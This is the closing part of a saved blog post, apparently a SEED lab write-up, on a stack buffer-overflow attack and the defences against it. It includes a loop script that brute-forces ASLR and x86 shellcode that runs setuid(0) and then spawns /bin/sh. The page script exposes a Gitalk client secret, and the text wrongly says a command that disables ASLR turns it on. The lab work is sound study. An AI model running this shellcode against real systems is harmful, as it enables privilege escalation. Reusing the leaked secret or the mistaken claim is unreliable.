+<p>When <code>$eip</code> points to <code>call bof</code>, input <code>s/step</code> to step into <code>bof</code>.</p>
+</li>
+</ol>
+<center><a class="fancybox" href="./Buffer-Overflow-Attack - clickmouse_files/run_bof.png" title=""><img src="./Buffer-Overflow-Attack - clickmouse_files/run_bof.png" class=""></a></center>
+<ol start="7">
+<li>Get the value of <code>$ebp</code> after <code>mov ebp, esp</code>.</li>
+</ol>
+<center><a class="fancybox" href="./Buffer-Overflow-Attack - clickmouse_files/ebp.png" title=""><img src="./Buffer-Overflow-Attack - clickmouse_files/ebp.png" class=""></a></center>
+<p>If you look back, you will find that <code>$ebp</code> in <code>gdb</code> mode is <code>0xbfffea18</code>. The distance is <code>64</code> between two values of <code>$ebp</code>. That’s why I have mentioned that <code>420</code> can be changed manually, but it may be better if the number is big enough.</p>
+<h1>Countermeasures</h1>
+<p>In <strong>before attack</strong> part, I have shut down 4 countermeasures, 2 of which belongs to the operating system, while others belong to <code>gcc</code>. I will talk about some details.</p>
+<h3 id="ASLR">ASLR</h3>
+<p>Why we can succeed at once? Because the initial position of stack doesn’t change. If we turn on <code>ASLR</code>, the initial position of stack alters every time this program is executed.</p>
+<p>Input the following command to turn on <code>ASLR</code>.</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></tbody></table></figure>
+<p>We need to write a shell script to run our program again and again.</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">SECONDS=0</span><br><span class="line">value=0</span><br><span class="line"><span class="keyword">while</span> [ 1 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">value=$((<span class="variable">$value</span> + 1))</span><br><span class="line">duration=<span class="variable">$SECONDS</span></span><br><span class="line">min=$((<span class="variable">$duration</span> / 60))</span><br><span class="line">sec=$((<span class="variable">$duration</span> % 60))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$min</span> minutes and <span class="variable">$sec</span> seconds elapsed."</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"The program has been running <span class="variable">$value</span> times so far."</span></span><br><span class="line">./stack</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure>
+<center><a class="fancybox" href="./Buffer-Overflow-Attack - clickmouse_files/9_times.png" title=""><img src="./Buffer-Overflow-Attack - clickmouse_files/9_times.png" class=""></a></center>
+<p>After 9 minutes’ attack, we finally succeed.</p>
+<p>Why can we succeed? Because the initial position floats in a small range(about plus-minus 200). Remember <code>nop</code> I talk about before? It shows their function here.</p>
+<h3 id="Dash">Dash</h3>
+<p><code>dash</code> will check whether the <code>uid</code> is the same with <code>euid</code>. If not, it will deprive your <code>root</code> permission.</p>
+<p>If we can add some instructions like <code>setuid(0)</code> before <code>execve</code> , we can easily defeat dash.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">"\x31\xc0"</span> <span class="comment">/* Line 1: xorl %eax,%eax */</span></span><br><span class="line"><span class="string">"\x31\xdb"</span> <span class="comment">/* Line 2: xorl %ebx,%ebx */</span></span><br><span class="line"><span class="string">"\xb0\xd5"</span> <span class="comment">/* Line 3: movb $0xd5,%al */</span>  </span><br><span class="line"><span class="string">"\xcd\x80"</span> <span class="comment">/* Line 4: int $0x80 */</span></span><br><span class="line"><span class="comment">// ---- The code below is the same as the one in Task 2 ---</span></span><br><span class="line"><span class="string">"\x31\xc0"</span></span><br><span class="line"><span class="string">"\x50"</span></span><br><span class="line"><span class="string">"\x68"</span><span class="string">"//sh"</span></span><br><span class="line"><span class="string">"\x68"</span><span class="string">"/bin"</span></span><br><span class="line"><span class="string">"\x89\xe3"</span></span><br><span class="line"><span class="string">"\x50"</span></span><br><span class="line"><span class="string">"\x53"</span></span><br><span class="line"><span class="string">"\x89\xe1"</span></span><br><span class="line"><span class="string">"\x99"</span></span><br><span class="line"><span class="string">"\xb0\x0b"</span></span><br><span class="line"><span class="string">"\xcd\x80"</span></span><br></pre></td></tr></tbody></table></figure>
+<p><code>setuid</code> is a system call whose system call number is <code>0xd5</code>. If we shutdown ASLR, we can easily get the result.</p>
+<center><a class="fancybox" href="./Buffer-Overflow-Attack - clickmouse_files/dash.png" title=""><img src="./Buffer-Overflow-Attack - clickmouse_files/dash.png" class=""></a></center>
+<h3 id="Non-execstack-and-stack-guard">Non-execstack and stack guard</h3>
+<p>In this experiment,I didn’t find any solution to these two countermeasures. The results are below.</p>
+<center><a class="fancybox" href="./Buffer-Overflow-Attack - clickmouse_files/stack_noexec.png" title=""><img src="./Buffer-Overflow-Attack - clickmouse_files/stack_noexec.png" class=""></a></center>
+<br>
+<center><a class="fancybox" href="./Buffer-Overflow-Attack - clickmouse_files/stack_with_guard.png" title=""><img src="./Buffer-Overflow-Attack - clickmouse_files/stack_with_guard.png" class=""></a></center>
+      </div>
+      <div class="post-copyright">
+    <p class="copyright-item">
+      <span>Author: </span>
+      <a href="https://clickmouse.github.io/">clickmouse</a>
+    </p>
+    <p class="copyright-item">
+      <span>Link: </span>
+      <a href="https://clickmouse.github.io/Buffer_Overflow/">https://clickmouse.github.io/Buffer_Overflow/</a>
+    </p>
+    <p class="copyright-item">
+      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+    </p>
+  </div>
+      <footer class="post-footer">
+        <div class="post-tags">
+            <a href="https://clickmouse.github.io/tags/linux/">linux</a>
+            <a href="https://clickmouse.github.io/tags/seed-lab/">seed-lab</a>
+            <a href="https://clickmouse.github.io/tags/gdb/">gdb</a>
+            <a href="https://clickmouse.github.io/tags/buffer-overflow/">buffer-overflow</a>
+            </div>
+        
+        <nav class="post-nav"><a class="next" href="https://clickmouse.github.io/Learn-Linux0_12/">
+        <span class="next-text nav-default">Learn Linux-0.12</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"><div id="gitalk-container"><div class="gt-container"><div class="gt-meta"><span class="gt-counts"><a class="gt-link gt-link-counts" href="https://github.com/clickmouse/blog_comments/issues/4" target="_blank" rel="noopener noreferrer">0</a> comments</span><div class="gt-user"><div class="gt-user-inner"><span class="gt-user-name">Anonymous</span><span class="gt-ico gt-ico-arrdown"><span class="gt-svg"><svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" p-id="1619"><path d="M511.872 676.8c-0.003 0-0.006 0-0.008 0-9.137 0-17.379-3.829-23.21-9.97l-251.277-265.614c-5.415-5.72-8.743-13.464-8.744-21.984 0-17.678 14.33-32.008 32.008-32.008 9.157 0 17.416 3.845 23.25 10.009l228.045 241.103 228.224-241.088c5.855-6.165 14.113-10.001 23.266-10.001 8.516 0 16.256 3.32 21.998 8.736 12.784 12.145 13.36 32.434 1.264 45.233l-251.52 265.6c-5.844 6.155-14.086 9.984-23.223 9.984-0.025 0-0.051 0-0.076 0z" p-id="1620"></path></svg></span></span></div></div></div><div class="gt-header"><a class="gt-avatar-github"><span class="gt-ico gt-ico-github"><span class="gt-svg"><svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64 524C64 719.602 189.356 885.926 364.113 947.017 387.65799 953 384 936.115 384 924.767L384 847.107C248.118 863.007 242.674 773.052 233.5 758.001 215 726.501 171.5 718.501 184.5 703.501 215.5 687.501 247 707.501 283.5 761.501 309.956 800.642 361.366 794.075 387.658 787.497 393.403 763.997 405.637 743.042 422.353 726.638 281.774 701.609 223 615.67 223 513.5 223 464.053 239.322 418.406 271.465 381.627 251.142 320.928 273.421 269.19 276.337 261.415 334.458 256.131 394.888 302.993 399.549 306.685 432.663 297.835 470.341 293 512.5 293 554.924 293 592.81 297.896 626.075 306.853 637.426 298.219 693.46 258.054 747.5 262.966 750.382 270.652 772.185 321.292 753.058 381.083 785.516 417.956 802 463.809 802 513.5 802 615.874 742.99 701.953 601.803 726.786 625.381 750.003 640 782.295 640 818.008L640 930.653C640.752 939.626 640 948.664978 655.086 948.665 832.344 888.962 960 721.389 960 524 960 276.576 759.424 76 512 76 264.577 76 64 276.576 64 524Z"></path>
+</svg>
+</span></span></a><div class="gt-header-comment"><textarea class="gt-header-textarea " placeholder="Leave a comment" style="overflow: hidden; overflow-wrap: break-word; resize: none; height: 71.6px;"></textarea><div class="gt-header-preview markdown-body hide"></div><div class="gt-header-controls"><a class="gt-header-controls-tip" href="https://guides.github.com/features/mastering-markdown/" target="_blank" rel="noopener noreferrer"><span class="gt-ico gt-ico-tip"><span class="gt-svg"><svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 366.949535c-16.065554 0-29.982212 13.405016-29.982212 29.879884l0 359.070251c0 16.167882 13.405016 29.879884 29.982212 29.879884 15.963226 0 29.879884-13.405016 29.879884-29.879884L541.879884 396.829419C541.879884 380.763865 528.474868 366.949535 512 366.949535L512 366.949535z" p-id="3083"></path>
+  <path d="M482.017788 287.645048c0-7.776956 3.274508-15.553912 8.80024-21.181973 5.525732-5.525732 13.302688-8.80024 21.181973-8.80024 7.776956 0 15.553912 3.274508 21.079644 8.80024 5.525732 5.62806 8.80024 13.405016 8.80024 21.181973 0 7.776956-3.274508 15.656241-8.80024 21.181973-5.525732 5.525732-13.405016 8.697911-21.079644 8.697911-7.879285 0-15.656241-3.274508-21.181973-8.697911C485.292295 303.301289 482.017788 295.524333 482.017788 287.645048L482.017788 287.645048z" p-id="3084"></path>
+  <path d="M512 946.844409c-239.8577 0-434.895573-195.037873-434.895573-434.895573 0-239.8577 195.037873-434.895573 434.895573-434.895573 239.755371 0 434.895573 195.037873 434.895573 434.895573C946.895573 751.806535 751.755371 946.844409 512 946.844409zM512 126.17088c-212.740682 0-385.880284 173.037274-385.880284 385.777955 0 212.740682 173.037274 385.777955 385.880284 385.777955 212.740682 0 385.777955-173.037274 385.777955-385.777955C897.777955 299.208154 724.740682 126.17088 512 126.17088z" p-id="3085"></path>
+</svg>
+</span><span class="gt-ico-text">Markdown is supported</span></span></a><button class="gt-btn gt-btn-preview"><span class="gt-btn-text">Preview</span></button><button class="gt-btn gt-btn-login"><span class="gt-btn-text">Login with GitHub</span></button></div></div></div><div class="gt-comments"><div style="position: relative;"></div><p class="gt-comments-null">Be the first person to leave a comment!</p></div></div></div>
+    </div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:zhangxv@zju.edu.cn" class="iconfont icon-email" title="email"></a>
+        <a href="https://github.com/clickmouse" target="_blank" rel="noopener" class="iconfont icon-github" title="github"></a>
+        <a href="https://clickmouse.github.io/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even" target="_blank" rel="noopener">Even</a>
+  </span>
+
+  <span class="copyright-year">©2020<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">clickmouse</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top" style="display: block;">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+<script src="./Buffer-Overflow-Attack - clickmouse_files/gitalk.min.js.download"></script>
+
+
+<link rel="stylesheet" href="./Buffer-Overflow-Attack - clickmouse_files/gitalk.min.css">
+
+
+<script src="./Buffer-Overflow-Attack - clickmouse_files/md5.min.js.download"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '6170919e622371b87c21',
+    clientSecret: '2d002a7dac1fbe035d6997c72cebb9df83b8dc24',
+    repo: 'blog_comments',
+    owner: 'clickmouse',
+    admin: ['clickmouse'],
+    id: md5(location.pathname),
+    
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script><script type="text/javascript" src="./Buffer-Overflow-Attack - clickmouse_files/jquery.min.js.download"></script>
+  <script type="text/javascript" src="./Buffer-Overflow-Attack - clickmouse_files/slideout.js.download"></script>
+  <script type="text/javascript" src="./Buffer-Overflow-Attack - clickmouse_files/jquery.fancybox.pack.js.download"></script>
+  <script type="text/javascript" src="./Buffer-Overflow-Attack - clickmouse_files/even.js.download"></script>
+
+
+<img id="translator-icon" src="chrome-extension://gpahcnbjaopcgcpdjnjcmkllkcipbmjk/icons/icon-128.png" style="display: none;"><div id="translator-container" style="display: none;">
+<div class="rapid-header">
+  <img сlass="rapid-logo" src="chrome-extension://gpahcnbjaopcgcpdjnjcmkllkcipbmjk/icons/logo.svg">
+  <img сlass="rapid-icon" id="rapid-copy" src="chrome-extension://gpahcnbjaopcgcpdjnjcmkllkcipbmjk/icons/copy.svg">
+</div><div id="rapid-text-wrapper"><span></span></div>
+
+<div class="rapid-footer">
+  <span id="rapid-first-language">ENG</span>
+  <img id="rapid-arrow-icon" src="chrome-extension://gpahcnbjaopcgcpdjnjcmkllkcipbmjk/icons/r-arrow.svg">
+  <span id="rapid-second-language">FRN</span>
+</div></div></body></html>
